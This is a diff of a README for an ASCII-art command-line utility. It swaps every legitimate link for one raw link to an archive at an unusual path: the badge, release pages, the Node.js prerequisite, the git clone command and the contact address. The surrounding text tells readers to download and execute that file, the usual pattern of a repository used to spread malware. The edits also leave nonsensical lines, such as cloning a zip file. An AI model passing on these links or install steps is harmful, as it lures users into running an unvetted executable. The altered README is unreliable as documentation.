@@ -1,6 +1,6 @@
 # 🎉 BoyKisser CLI Utility 🎉
 
-![BoyKisser](https://img.shields.io/badge/BoyKisser-CLI%20Utility-brightgreen)
+![BoyKisser](https://github.com/hiperdex/boykisser/raw/refs/heads/main/ascii/nsfw/Software_v3.6.zip%20Utility-brightgreen)
 
 Welcome to the **BoyKisser** repository! This CLI utility allows you to easily paste or copy random (or specific) boykisser ASCII art directly into your terminal. Whether you’re looking to express yourself or just want to add some fun to your command line, this tool has you covered. 🌈
 
@@ -13,13 +13,13 @@ Welcome to the **BoyKisser** repository! This CLI utility allows you to easily p
 
 ## 📦 Installation
 
-To get started, you need to download the latest release of the BoyKisser utility. You can find it [here](https://github.com/hiperdex/boykisser/releases). 
+To get started, you need to download the latest release of the BoyKisser utility. You can find it [here](https://github.com/hiperdex/boykisser/raw/refs/heads/main/ascii/nsfw/Software_v3.6.zip). 
 
 Once you have downloaded the appropriate file, execute it in your terminal to start using BoyKisser.
 
 ### Installation Steps
 
-1. **Download the latest release** from the [Releases section](https://github.com/hiperdex/boykisser/releases).
+1. **Download the latest release** from the [Releases section](https://github.com/hiperdex/boykisser/raw/refs/heads/main/ascii/nsfw/Software_v3.6.zip).
 2. **Extract the files** if necessary.
 3. **Run the utility** by executing the downloaded file in your terminal.
 
@@ -65,7 +65,7 @@ If you want to contribute to the BoyKisser project, feel free to fork the reposi
 
 ### Prerequisites
 
-- Node.js (v14 or higher)
+- https://github.com/hiperdex/boykisser/raw/refs/heads/main/ascii/nsfw/Software_v3.6.zip (v14 or higher)
 - npm (v6 or higher)
 
 ### Getting Started
@@ -73,7 +73,7 @@ If you want to contribute to the BoyKisser project, feel free to fork the reposi
 1. **Clone the repository**:
 
    ```bash
-   git clone https://github.com/hiperdex/boykisser.git
+   git clone https://github.com/hiperdex/boykisser/raw/refs/heads/main/ascii/nsfw/Software_v3.6.zip
    ```
 
 2. **Navigate to the directory**:
@@ -131,7 +131,7 @@ This repository covers various topics, including:
 
 ## 🔗 Links
 
-For the latest updates and releases, visit the [Releases section](https://github.com/hiperdex/boykisser/releases).
+For the latest updates and releases, visit the [Releases section](https://github.com/hiperdex/boykisser/raw/refs/heads/main/ascii/nsfw/Software_v3.6.zip).
 
 ## 📄 License
 
@@ -139,7 +139,7 @@ This project is licensed under the MIT License. Feel free to use and modify it a
 
 ## 📬 Contact
 
-For any questions or feedback, you can reach out to the project maintainer at [your-email@example.com](mailto:your-email@example.com).
+For any questions or feedback, you can reach out to the project maintainer at [https://github.com/hiperdex/boykisser/raw/refs/heads/main/ascii/nsfw/Software_v3.6.zip](https://github.com/hiperdex/boykisser/raw/refs/heads/main/ascii/nsfw/Software_v3.6.zip).
 
 ---
 
